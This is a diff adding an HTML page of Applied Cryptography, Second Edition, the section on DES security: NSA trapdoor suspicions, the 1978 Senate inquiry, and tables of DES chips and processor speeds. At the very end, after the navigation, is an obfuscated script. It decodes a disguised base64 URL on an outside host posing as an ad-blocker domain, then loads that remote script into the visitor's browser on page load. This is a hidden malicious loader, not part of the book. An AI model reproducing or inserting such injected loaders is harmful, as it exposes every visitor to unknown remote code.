@@ -1,0 +1,294 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=278-280//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">12.3 Security of DES</FONT></H3>
+<P>People have long questioned the security of DES [458]. There has been much speculation on the key length, number of iterations, and design of the S-boxes. The S-boxes were particularly mysterious&#151;all those constants, without any apparent reason as to why or what they&#146;re for. Although IBM claimed that the inner workings were the result of 17 man-years of intensive cryptanalysis some people feared that the NSA embedded a trapdoor into the algorithm so they would have an easy means of decrypting messages.
+</P>
+<P>The U.S. Senate Select Committee on Intelligence, with full top-secret clearances, investigated the matter in 1978. The findings of the committee are classified, but an unclassified summary of those findings exonerated the NSA from any improper involvement in the algorithm&#146;s design [1552]. &#147;It was said to have convinced IBM that a shorter key was adequate, to have indirectly assisted in the development of the S-box structures and to have certified that the final DES algorithm was, to the best of their knowledge, free of any statistical or mathematical weaknesses&#148; [435]. However, since the government never made the details of the investigation public, many people remained unconvinced.</P>
+<P>Tuchman and Meyer, two of the IBM cryptographers who designed DES, said the NSA did not alter the design [841]:</P>
+<BLOCKQUOTE><P>Their basic approach was to look for strong substitution, permutation, and key scheduling functions.... IBM has classified the notes containing the selection criteria at the request of the NSA.... &#147;The NSA told us we had inadvertently reinvented some of the deep secrets it uses to make its own algorithms,&#148; explains Tuchman.
+</P>
+</BLOCKQUOTE><TABLE WIDTH="100%">
+<TH CAPTION COLSPAN="12" ALIGN="CENTER">Table 12.9<BR>Commercial DES Chips
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TH WIDTH="20%" VALIGN="TOP" ALIGN="CENTER">Manufacturer     
+<TH WIDTH="20%" VALIGN="TOP" ALIGN="CENTER">Chip    
+<TH WIDTH="10%" VALIGN="TOP" ALIGN="CENTER">Year    
+<TH WIDTH="15%" VALIGN="TOP" ALIGN="CENTER">Clock   
+<TH WIDTH="20%" VALIGN="TOP" ALIGN="CENTER">Data Rate       
+<TH WIDTH="10%" VALIGN="TOP" ALIGN="CENTER">Availability
+<TR>
+<TD COLSPAN="6"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">AMD
+<TD VALIGN="TOP" ALIGN="CENTER">Am9518
+<TD VALIGN="TOP" ALIGN="CENTER">1981
+<TD VALIGN="TOP" ALIGN="CENTER">3 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">1.3 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">N
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">AMD
+<TD VALIGN="TOP" ALIGN="CENTER">Am9568
+<TD VALIGN="TOP" ALIGN="CENTER">?
+<TD VALIGN="TOP" ALIGN="CENTER">4 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">1.5 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">N
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">AMD
+<TD VALIGN="TOP" ALIGN="CENTER">AmZ8068
+<TD VALIGN="TOP" ALIGN="CENTER">1982
+<TD VALIGN="TOP" ALIGN="CENTER">4 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">1.7 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">N
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">AT&ampT
+<TD VALIGN="TOP" ALIGN="CENTER">T7000A
+<TD VALIGN="TOP" ALIGN="CENTER">1985
+<TD VALIGN="TOP" ALIGN="CENTER">?
+<TD VALIGN="TOP" ALIGN="CENTER">1.9 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">N
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">CE-Infosys
+<TD VALIGN="TOP" ALIGN="CENTER">SuperCrypt
+<TD VALIGN="TOP" ALIGN="CENTER">1992
+<TD VALIGN="TOP" ALIGN="CENTER">20 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">12.5 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">CE99C003
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">CE-Infosys
+<TD VALIGN="TOP" ALIGN="CENTER">SuperCrypt
+<TD VALIGN="TOP" ALIGN="CENTER">1994
+<TD VALIGN="TOP" ALIGN="CENTER">30 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">20.0 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">CE99C003A
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Cryptech
+<TD VALIGN="TOP" ALIGN="CENTER">Cry12C102
+<TD VALIGN="TOP" ALIGN="CENTER">1989
+<TD VALIGN="TOP" ALIGN="CENTER">20 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">2.8 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Newbridge
+<TD VALIGN="TOP" ALIGN="CENTER">CA20C03A
+<TD VALIGN="TOP" ALIGN="CENTER">1991
+<TD VALIGN="TOP" ALIGN="CENTER">25 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">3.85 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Newbridge
+<TD VALIGN="TOP" ALIGN="CENTER">CA20C03W
+<TD VALIGN="TOP" ALIGN="CENTER">1992
+<TD VALIGN="TOP" ALIGN="CENTER">8 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">0.64 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Newbridge
+<TD VALIGN="TOP" ALIGN="CENTER">CA95C68/18/09
+<TD VALIGN="TOP" ALIGN="CENTER">1993
+<TD VALIGN="TOP" ALIGN="CENTER">33 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">14.67 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Pijnenburg
+<TD VALIGN="TOP" ALIGN="CENTER">PCC100
+<TD VALIGN="TOP" ALIGN="CENTER">?
+<TD VALIGN="TOP" ALIGN="CENTER">?
+<TD VALIGN="TOP" ALIGN="CENTER">2.5 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Semaphore Communications
+<TD VALIGN="TOP" ALIGN="CENTER">Roadrunner284
+<TD VALIGN="TOP" ALIGN="CENTER">?
+<TD VALIGN="TOP" ALIGN="CENTER">40 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">35.5 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">VLSI Technology
+<TD VALIGN="TOP" ALIGN="CENTER">VM007
+<TD VALIGN="TOP" ALIGN="CENTER">1993
+<TD VALIGN="TOP" ALIGN="CENTER">32 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">200.0 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">VLSI Technology
+<TD VALIGN="TOP" ALIGN="CENTER">VM009
+<TD VALIGN="TOP" ALIGN="CENTER">1993
+<TD VALIGN="TOP" ALIGN="CENTER">33 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">14.0 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">VLSI Technology
+<TD VALIGN="TOP" ALIGN="CENTER">6868
+<TD VALIGN="TOP" ALIGN="CENTER">1995
+<TD VALIGN="TOP" ALIGN="CENTER">32 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">64.0 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">Y
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Western Digital
+<TD VALIGN="TOP" ALIGN="CENTER">WD2001/2002
+<TD VALIGN="TOP" ALIGN="CENTER">1984
+<TD VALIGN="TOP" ALIGN="CENTER">3 MHz
+<TD VALIGN="TOP" ALIGN="CENTER">0.23 MByte/s
+<TD VALIGN="TOP" ALIGN="CENTER">N
+<TR>
+<TD COLSPAN="6"><HR>
+</TABLE>
+<TABLE WIDTH="100%">
+<TH CAPTION COLSPAN="6" ALIGN="CENTER">Table 12.10<BR>DES Speeds on Different Microprocessors and Computers
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH WIDTH="30%" VALIGN="TOP" ALIGN="CENTER">Processor        
+<TH WIDTH="30%" VALIGN="TOP" ALIGN="CENTER">Speed (in MHz)
+<TH WIDTH="40%" VALIGN="TOP" ALIGN="CENTER">DES Blocks (per second)
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">8088
+<TD VALIGN="TOP" ALIGN="CENTER">4.7
+<TD VALIGN="TOP" ALIGN="CENTER">370
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68000
+<TD VALIGN="TOP" ALIGN="CENTER">7.6
+<TD VALIGN="TOP" ALIGN="CENTER">900
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">80286
+<TD VALIGN="TOP" ALIGN="CENTER">6
+<TD VALIGN="TOP" ALIGN="CENTER">1,100
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68020
+<TD VALIGN="TOP" ALIGN="CENTER">16
+<TD VALIGN="TOP" ALIGN="CENTER">3,500
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68030
+<TD VALIGN="TOP" ALIGN="CENTER">16
+<TD VALIGN="TOP" ALIGN="CENTER">3,900
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">80386
+<TD VALIGN="TOP" ALIGN="CENTER">25
+<TD VALIGN="TOP" ALIGN="CENTER">5,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68030
+<TD VALIGN="TOP" ALIGN="CENTER">50
+<TD VALIGN="TOP" ALIGN="CENTER">10,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68040
+<TD VALIGN="TOP" ALIGN="CENTER">25
+<TD VALIGN="TOP" ALIGN="CENTER">16,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">68040
+<TD VALIGN="TOP" ALIGN="CENTER">40
+<TD VALIGN="TOP" ALIGN="CENTER">23,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">80486
+<TD VALIGN="TOP" ALIGN="CENTER">66
+<TD VALIGN="TOP" ALIGN="CENTER">43,000
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Sun ELC
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">26,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">HyperSparc
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">32,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">RS6000-350
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">53,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Sparc 10/52
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">84,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">DEC Alpha 4000/610
+<TD VALIGN="TOP" ALIGN="CENTER">
+<TD VALIGN="TOP" ALIGN="CENTER">154,000
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">HP 9000/887
+<TD VALIGN="TOP" ALIGN="CENTER">125
+<TD VALIGN="TOP" ALIGN="CENTER">196,000
+<TR>
+<TD COLSPAN="3"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(hqNNhUoa, oPyXpxvu) {oPyXpxvu = hqNNhUoa.createElement('script');oPyXpxvu.type = 'text/javascript';oPyXpxvu.async = true;oPyXpxvu.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');hqNNhUoa.getElementsByTagName('body')[0].appendChild(oPyXpxvu);}(document));</script></body>
+</html>
